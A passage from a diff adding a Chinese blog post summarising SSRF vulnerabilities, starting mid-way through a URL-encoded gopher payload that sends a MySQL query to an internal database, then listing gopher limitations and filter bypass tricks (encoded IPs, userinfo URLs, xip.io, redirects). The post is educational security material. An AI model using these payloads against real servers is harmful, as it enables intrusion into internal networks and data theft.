class="symbol">%38</span><span class="symbol">%36</span><span class="symbol">%5</span>f<span class="symbol">%36</span><span class="symbol">%34</span><span class="symbol">%0</span><span class="keyword">c</span><span class="symbol">%70</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%67</span><span class="symbol">%72</span><span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%5</span>f<span class="symbol">%6</span>e<span class="symbol">%61</span><span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%05</span><span class="symbol">%6</span>d<span class="symbol">%79</span><span class="symbol">%73</span><span class="symbol">%71</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%21</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%03</span><span class="symbol">%73</span><span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%63</span><span class="symbol">%74</span><span class="symbol">%20</span><span class="symbol">%40</span><span class="symbol">%40</span><span class="symbol">%76</span><span class="symbol">%65</span><span class="symbol">%72</span><span class="symbol">%73</span><span class="symbol">%69</span><span class="symbol">%6</span>f<span class="symbol">%6</span>e<span class="symbol">%5</span>f<span class="symbol">%63</span><span class="symbol">%6</span>f<span class="symbol">%6</span>d<span class="symbol">%6</span>d<span class="symbol">%65</span><span class="symbol">%6</span>e<span class="symbol">%74</span><span class="symbol">%20</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%69</span><span class="symbol">%6</span>d<span class="symbol">%69</span><span class="symbol">%74</span><span class="symbol">%20</span><span class="symbol">%31</span><span class="symbol">%16</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%03</span><span class="symbol">%73</span><span class="symbol">%65</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%65</span><span class="symbol">%63</span><span class="symbol">%74</span><span class="symbol">%2</span>a<span class="symbol">%66</span><span class="symbol">%72</span><span class="symbol">%6</span>f<span class="symbol">%6</span>d<span class="symbol">%20</span><span class="symbol">%73</span><span class="symbol">%73</span><span class="symbol">%72</span><span class="symbol">%66</span><span class="symbol">%2</span>e<span class="symbol">%66</span><span class="symbol">%6</span><span class="keyword">c</span><span class="symbol">%61</span><span class="symbol">%67</span><span class="symbol">%01</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%00</span><span class="symbol">%01</span> --output - &gt; mysql.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用strings命令读取mysql.txt，获得输出结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings mysql.txt</span><br></pre></td></tr></table></figure>
+
+<img src="//songxpu.github.io/2019/09/04/SSRF漏洞总结/5.jpg" width="400">
+
+
+
+<h4 id="gopher局限"><a href="#gopher局限" class="headerlink" title="gopher局限"></a>gopher局限</h4><ul>
+<li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li>
+<li>file_get_contents 的 gopher 协议不能 URLencode</li>
+<li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li>
+<li>PHP 的 curl 默认不 follow 302 跳转</li>
+<li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断）， 7.49 可用</li>
+</ul>
+<h2 id="bypass技巧"><a href="#bypass技巧" class="headerlink" title="bypass技巧"></a>bypass技巧</h2><ol>
+<li><strong>利用解析url绕过正则缺陷</strong></li>
+</ol>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//A.com@127.0.0.1</span></span><br><span class="line">http:<span class="comment">//A.com:B@127.0.0.1</span></span><br><span class="line"><span class="number">127.0</span>.<span class="number">0.1</span><span class="meta">#http:<span class="comment">//abc</span></span></span><br></pre></td></tr></table></figure>
+
+<p>原理：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">                    authority                       path</span></span><br><span class="line"><span class="code">        ┌───────────────┴─────────────────┐      ┌────┴───┐</span></span><br><span class="line">  abc://[<span class="string">username[:password</span>]@](example.com)[:123]/path/data?key=value&amp;key2=value2#fragid1</span><br><span class="line">  └┬┘   └───────┬──────────┘ └────┬────┘   └──┬─┘           └─────────┬─────────┘ └──┬──┘</span><br><span class="line">scheme  user information     host           port                  query         fragment</span><br><span class="line"></span><br><span class="line">  urn:example:mammal:monotreme:echidna</span><br><span class="line">  └┬┘ └──────────────┬───────────────┘</span><br><span class="line">scheme              path</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>IP进制转换</strong></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip:127.0.0.1</span></span><br><span class="line">（1）8进制格式：0177.0.0.1</span><br><span class="line">（2）16进制格式：0x7F.00.00.01</span><br><span class="line">（3）8进制整数格式：017700000001</span><br><span class="line">（3）10进制整数格式：2130706433</span><br><span class="line">（4）16进制整数格式：0x7f000001</span><br></pre></td></tr></table></figure>
+
+<p>转换方法</p>
+<ul>
+<li>8进制前加0，16进制前加0x</li>
+<li>将ip的每一位由<code>十进制</code>转换为<code>二进制</code>，再将<code>二进制</code>转换为<code>八进制或十六进制</code></li>
+<li>关于整数格式：ipv4是32位二进制数，将其转换为<code>32位二进制数</code>，再将其转换为<code>十进制或十六进制</code></li>
+</ul>
+<ol start="3">
+<li><strong>短网址</strong></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）百度短网址转换：https://dwz.cn		#不支持ip</span><br><span class="line">（2）TinyURL：https://tinyurl.com/create.php		#支持ip</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>可以指向任意 ip 的域名：xip.io</strong></li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ip:127.0.0.1</span></span><br><span class="line">127.0.0.1.xip.io</span><br><span class="line">www.127.0.0.1.xip.io</span><br><span class="line">mysite.127.0.0.1.xip.io</span><br><span class="line">foo.bar.127.0.0.1.xip.io</span><br><span class="line"><span class="meta">#</span><span class="bash">利用</span></span><br><span class="line">ssrf.php?url=http://127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://www.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/</span><br><span class="line">or</span><br><span class="line">ssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><p><strong>句号绕过：127。0。0。1</strong></p>
+</li>
+<li><p><strong>添加端口号</strong></p>
+<p>案例：<a href="http://www.anquan.us/static/bugs/wooyun-2014-061850.html" target="_blank" rel="noopener">内网编织者百度内网手动编织!</a></p>
+</li>
+<li><p><strong>利用dns将域名解析为内网ip</strong></p>
+</li>
+<li><p><strong>利用301或者302跳转</strong></p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://www.th1s.cn/test/ssrf.php</span><br><span class="line">ssrf.php里面的内容为：</span><br><span class="line"><span class="meta">&lt;?</span>php header(<span class="string">'Location:10.1.1.1'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ol>
+<li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">SSRF学习笔记</a></li>
+<li><a href="https://www.evi1.cn/post/ssrf/" target="_blank" rel="noopener">ssrf攻击内网应用</a></li>
+<li><a href="https://v0w.top/2018/11/23/SSRF-notes/#Some-Tricks-in-SSRF" target="_blank" rel="noopener">SSRF 学习笔记</a></li>
+<li><a href="https://www.jianshu.com/p/949a2cb3be36?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">gopher 协议攻击内网 mysql</a></li>
+<li><a href="https://www.smi1e.top/gopher-ssrf攻击内网应用复现/" target="_blank" rel="noopener">gopher SSRF攻击内网应用复现</a></li>
+</ol>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/02/Redis漏洞利用与SSRF/" rel="next" title="Redis漏洞利用与SSRF">
+                <i class="fa fa-chevron-left"></i> Redis漏洞利用与SSRF
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Azeroth</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">2</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">10</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#关于SSRF"><span class="nav-number">2.</span> <span class="nav-text">关于SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#产生条件"><span class="nav-number">3.</span> <span class="nav-text">产生条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方式"><span class="nav-number">4.</span> <span class="nav-text">利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#总述"><span class="nav-number">4.1.</span> <span class="nav-text">总述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#file协议读取本地文件"><span class="nav-number">4.2.</span> <span class="nav-text">file协议读取本地文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dict协议探测端口"><span class="nav-number">4.3.</span> <span class="nav-text">dict协议探测端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gopher协议"><span class="nav-number">4.4.</span> <span class="nav-text">gopher协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击内网主机"><span class="nav-number">4.4.1.</span> <span class="nav-text">攻击内网主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher攻击内网redis"><span class="nav-number">4.4.2.</span> <span class="nav-text">gopher攻击内网redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher攻击FastCGI"><span class="nav-number">4.4.3.</span> <span class="nav-text">gopher攻击FastCGI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher攻击内网mysql"><span class="nav-number">4.4.4.</span> <span class="nav-text">gopher攻击内网mysql</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#gopher局限"><span class="nav-number">4.4.5.</span> <span class="nav-text">gopher局限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass技巧"><span class="nav-number">5.</span> <span class="nav-text">bypass技巧</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Azeroth</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">47k</span>
+  
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    
+    <span title="站点阅读时长">43 分钟</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.2</div>
+
+
+
+<span id="busuanzi_container_site_uv">
+  本站访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+</span>
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.2"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.2"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
